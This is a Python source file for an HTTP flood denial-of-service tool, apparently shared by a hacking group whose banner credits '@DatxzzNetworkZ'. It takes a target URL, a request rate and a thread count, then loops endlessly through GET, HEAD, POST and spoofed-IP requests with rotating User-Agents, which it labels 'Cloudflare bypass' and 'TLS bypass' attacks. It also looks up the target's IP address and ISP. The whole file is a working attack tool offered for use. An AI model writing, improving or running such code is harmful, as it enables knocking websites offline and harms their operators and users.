import requests
import threading
import random
from concurrent.futures import ThreadPoolExecutor
import time
import socket
from bs4 import BeautifulSoup

# List of 10 different User-Agent headers
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:63.0) Gecko/20100101 Firefox/63.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; rv:58.0) Gecko/20100101 Firefox/58.0',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edge/91.0.864.64',
    'Mozilla/5.0 (Linux; Android 8.0.0; Nexus 6P Build/OPR6.170623.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36'
]

# Function to randomly choose a User-Agent
def get_random_user_agent():
    return random.choice(user_agents)

# Function to simulate a rapid GET request
def rapid_get_request(url):
    headers = {
        'User-Agent': get_random_user_agent(),
        'X-Requested-With': 'XMLHttpRequest',
        'Accept': 'application/json',
        'Connection': 'keep-alive',
    }
    try:
        requests.get(url, headers=headers, timeout=5)
    except requests.exceptions.RequestException as e:
        pass  # Silent failure

# Function for sending HEAD requests (HULK HEAD) - HTTP/1.1
def hulk_head_request_http1(url):
    headers = {
        'User-Agent': get_random_user_agent(),
        'Connection': 'keep-alive',
    }
    try:
        requests.head(url, headers=headers, timeout=5)
    except requests.exceptions.RequestException as e:
        pass  # Silent failure

# Function for sending POST requests (to simulate attacks on forms or login endpoints)
def post_request(url):
    headers = {
        'User-Agent': get_random_user_agent(),
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'keep-alive',
    }
    data = {'username': 'test', 'password': 'test123'}  # Dummy post data
    try:
        requests.post(url, headers=headers, data=data, timeout=5)
    except requests.exceptions.RequestException as e:
        pass  # Silent failure

# Function to simulate a TLS bypass attack using GET requests
def tls_bypass_request(url):
    headers = {
        'User-Agent': get_random_user_agent(),
        'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
        'Connection': 'keep-alive',
    }
    try:
        requests.get(url, headers=headers, timeout=5)
    except requests.exceptions.RequestException as e:
        pass  # Silent failure

# Function to simulate a Cloudflare bypass attack by simulating multiple requests
def cloudflare_bypass_attack(url, base_rps):
    attack_methods = ['GET', 'HEAD', 'POST', 'TLS Bypass']
    while True:
        # Randomize which method to show
        method = random.choice(attack_methods)
        # Only perform the attack based on the selected method
        if method == 'GET':
            rapid_get_request(url)
        elif method == 'HEAD':
            hulk_head_request_http1(url)
        elif method == 'POST':
            post_request(url)
        elif method == 'TLS Bypass':
            tls_bypass_request(url)
        
        time.sleep(1 / base_rps)  # Attack frequency

# Function to display the banner
def show_banner():
    print("""
▗▄▄▄ ▗▄▄▄  ▗▄▖  ▗▄▄▖
▐▌  █▐▌  █▐▌ ▐▌▐▌   
▐▌  █▐▌  █▐▌ ▐▌ ▝▀▚▖
▐▙▄▄▀▐▙▄▄▀▝▚▄▞▘▗▄▄▞▘
**********************************
Maker By : @DatxzzNetworkZ
Version : 2.5
Author : @DatxzzNetworkZ
Team : Jabar Error System 
**********************************              
                    
""")

# Worker function to run in threads
def thread_worker(url, rps):
    cloudflare_bypass_attack(url, rps)

# Function to validate and correct the URL format
def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        return 'http://' + url  # Default to http if no scheme is provided
    return url

# Function to get website details (IP, ISP, Title)
def get_website_details(url):
    # Get IP address
    try:
        ip_address = socket.gethostbyname(url)
        print(f"Website IP Address: {ip_address}")
    except socket.gaierror as e:
        print(f"Could not resolve IP for {url}: {e}")
        ip_address = None

    # Get ISP information using ipinfo.io API
    if ip_address:
        try:
            response = requests.get(f'https://ipinfo.io/{ip_address}/json')
            data = response.json()
            isp = data.get('org', 'ISP information not available')
            print(f"ISP: {isp}")
        except requests.exceptions.RequestException as e:
            print(f"Could not fetch ISP info: {e}")

    # Get Title of the webpage
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        title = soup.title.string if soup.title else 'No title found'
        print(f"Website Title: {title}")
    except requests.exceptions.RequestException as e:
        print(f"Could not fetch the title: {e}")

def main():
    show_banner()  # Display the banner message

    # Get user input
    target_url = input('Enter the target URL: ')
    base_rps = int(input('Enter the number of requests per second (RPS): '))
    num_threads = int(input('Enter the number of threads: '))

    target_url = validate_url(target_url)  # Ensure the URL is correct

    # Show website details
    get_website_details(target_url)

    # Only print the starting attack message once
    print(f"Starting attack on {target_url} with {num_threads} threads, each sending {base_rps} requests per second...")
    
    # Create worker threads using ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for _ in range(num_threads):
            executor.submit(thread_worker, target_url, base_rps)

if __name__ == '__main__':
    main()
